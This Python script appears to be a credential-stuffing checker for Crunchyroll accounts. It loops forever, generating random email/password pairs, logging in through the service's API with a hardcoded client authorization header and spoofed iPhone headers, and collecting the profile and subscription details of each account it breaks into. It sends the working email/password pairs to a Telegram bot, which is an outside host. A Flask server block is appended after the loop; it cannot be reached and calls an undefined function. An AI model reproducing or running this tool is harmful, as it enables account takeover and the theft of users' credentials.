from flask import Flask, request, jsonify
import os

app = Flask(__name__)
import requests, json, uuid, random 
def Greq(url, data, headers):
    response = requests.post(url, data=data, headers=headers)
    try:
        Gresponse = response.json()
    except json.JSONDecodeError as e:
        Gresponse = None
    return Gresponse

def Gget(url, headers):
    response = requests.get(url, headers=headers)
    try:
        Gresponse = response.json()
    except json.JSONDecodeError as e:
        Gresponse = None
    return Gresponse
CO = []
GD1 = '\x1b[38;5;196m'
GD2 = '\x1b[38;5;50m'
GD3 = '\x1b[38;5;121m'
GD4 = '\x1b[38;5;47m'
GD5 = '\x1b[38;5;8m'
token=input(GD4+"TOKEN:"+GD3)
ID=input(GD4+"ID:"+GD3)
ok, bad=0,0
def main():
    global ok, bad
    ALL = ''.join(random.choices("qwertyuiopasdfghjklzxcvbnm", k=random.randint(7, 10)))
    NUM = ''.join(random.choices("1234567890", k=random.randint(2, 3)))
    COM = ALL + NUM
    CO.append(COM)
    COMPO = random.choice(CO)
    email =COMPO+"@gmail.com"
    password = COMPO
    G1 = "https://beta-api.crunchyroll.com"
    G3 = f"{G1}/auth/v1/token"
    G4 = {
        "device_id": str(uuid.uuid4()),
        "device_name": "iPhone",
        "device_type": "iPhone 14 Pro",
        "grant_type": "password",
        "password": password,
        "scope": "offline_access",
        "username": email
    }
    G5 = {
        "Host": "beta-api.crunchyroll.com",
        "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
        "Accept": "*/*",
        "Connection": "keep-alive",
        "ETP-Anonymous-ID": str(uuid.uuid4()),
        "User-Agent": "Crunchyroll/4.48.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3578348.327156123) iOS/17.4.1 Gravity/4.48.1",
        "Accept-Language": "en-EG;q=1.0, ar-EG;q=0.9",
        "Authorization": "Basic YXJ1ZDEtbnJhdGcxYW94NmRsaGU6TlRDMXFpdGczQ3p1TWVkTnlZZ3BGblk0NzdVTGxacnk=",
        "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
    }
    try:
        G6 = Greq(G3, G4, G5)
        G7 = G6.get("access_token")
        if not G7:
            bad+=1
            print(f'{GD4}Ok:{GD3}{ok} |{GD1}Bad:{bad}')

            return
        G8 = f"{G1}/accounts/v1/me/profile"
        G9 = {
            "User-Agent": "Crunchyroll/4.40.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3396672.324304509) iOS/17.1.1 Gravity/4.40.1",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Host": "beta-api.crunchyroll.com",
            "Connection": "keep-alive",
            "Accept-Language": "en-US;q=1.0, ar-US;q=0.9",
            "Authorization": f"Bearer {G7}",
            "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
        }
        G10 = Gget(G8, G9)
        G11 = G10.get("profile_name")
        G12 = G10.get("username")
        G13 = G10.get("country")
        G14 = f"{G1}/accounts/v1/me"
        G15 = {
            "Host": "beta-api.crunchyroll.com",
            "Accept": "*/*",
            "Connection": "keep-alive",
            "User-Agent": "Crunchyroll/4.40.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3396672.324304509) iOS/17.1.1 Gravity/4.40.1",
            "Accept-Language": "en-US;q=1.0, ar-US;q=0.9",
            "Authorization": f"Bearer {G7}",
            "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
        }
        G16 = Gget(G14, G15)
        G17 = G16.get("G17")
        if G17:
            G18 = f"{G1}/subs/v1/subscriptions/{G17}"
            G19 = {
                "Host": "beta-api.crunchyroll.com",
                "Accept": "*/*",
                "Connection": "keep-alive",
                "User-Agent": "Crunchyroll/4.40.1 (bundle_identifier:com.crunchyroll.iphone; build_number:3396672.324304509) iOS/17.1.1 Gravity/4.40.1",
                "Accept-Language": "en-US;q=1.0, ar-US;q=0.9",
                "Authorization": f"Bearer {G7}",
                "Accept-Encoding": "gzip;q=1.0, compress;q=0.5"
            }
            G20 = Gget(G18, G19)
            Gss = len(G20) if G20 else 0
        else:
            Gss = 0
        ok+=1
        
        print(f'''{GD3}~ crunchyroll 🎶
———————————
•Email:{email} 
•password:{password}
———————————
•name:{G11} 👤
•username:{G12}
•country:{G13}
•id:{G17}
•subscriptions:{Gss}
———————————
•by: @py_2j ♡ @WW_GGW''')
        tlg=f'''~ crunchyroll 🎶
———————————
•Email:{email} 
•password:{password}
———————————
•name:{G11} 👤
•username:{G12}
•country:{G13}
•id:{G17}
•subscriptions:{Gss}
———————————
•by: @py_2j ♡ @WW_GGW'''
        requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}')
    except requests.exceptions.RequestException:
        print(f"Error")

while True:
    main()
@app.route('/run', methods=['POST'])
def run():
    data = request.get_json()
    if not data or 'input' not in data:
        return jsonify({'error': 'الرجاء إرسال حقل input'}), 400
    output = your_python_function(data['input'])
    return jsonify({'result': output})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)